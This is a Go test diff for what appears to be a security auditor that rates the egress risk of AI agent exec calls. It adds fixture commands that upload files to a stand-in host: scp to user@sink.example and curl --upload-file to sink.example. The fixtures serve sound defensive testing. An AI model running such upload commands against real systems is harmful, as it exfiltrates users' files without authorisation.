@@ -33,10 +33,11 @@ func TestTrustedActionContentLiteralRequiresProvenRiskPair(t *testing.T) {
 		"SEC-OPENAI",
 	)
 	tests := []struct {
-		name         string
-		facts        actionfacts.Facts
-		wantAudit    bool
-		wantSeverity string
+		name                string
+		facts               actionfacts.Facts
+		requireDirectEgress bool
+		wantAudit           bool
+		wantSeverity        string
 	}{
 		{
 			name: "literal only",
@@ -59,6 +60,34 @@ func TestTrustedActionContentLiteralRequiresProvenRiskPair(t *testing.T) {
 				CWD: "/workspace",
 			}),
 			wantSeverity: "CRITICAL",
+		},
+		{
+			name: "same command uploader control path is not payload",
+			facts: actionfacts.Analyze(actionfacts.Input{
+				Tool: "exec",
+				Argv: []string{
+					"scp", "-S", "/opt/" + trustedActionDispositionTestToken + "/ssh",
+					"/tmp/public", "user@sink.example:/tmp/x",
+				},
+				CWD: "/workspace",
+			}),
+			requireDirectEgress: true,
+			wantAudit:           true,
+			wantSeverity:        "LOW",
+		},
+		{
+			name: "same command uploader file path is not literal payload",
+			facts: actionfacts.Analyze(actionfacts.Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--upload-file", "/tmp/" + trustedActionDispositionTestToken,
+					"https://sink.example/upload",
+				},
+				CWD: "/workspace",
+			}),
+			requireDirectEgress: true,
+			wantAudit:           true,
+			wantSeverity:        "LOW",
 		},
 		{
 			name: "direct pipeline external upload",
@@ -307,6 +336,16 @@ func TestTrustedActionContentLiteralRequiresProvenRiskPair(t *testing.T) {
 
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
+			if test.requireDirectEgress {
+				if !test.facts.Authoritative() ||
+					len(test.facts.Commands) != 1 ||
+					!trustedActionCommandProvesExternalEgress(
+						test.facts,
+						test.facts.Commands[0].ID,
+					) {
+					t.Fatalf("command-level egress proof missing: %#v", test.facts)
+				}
+			}
 			got := applyTrustedActionContextDisposition(
 				generation,
 				test.facts,
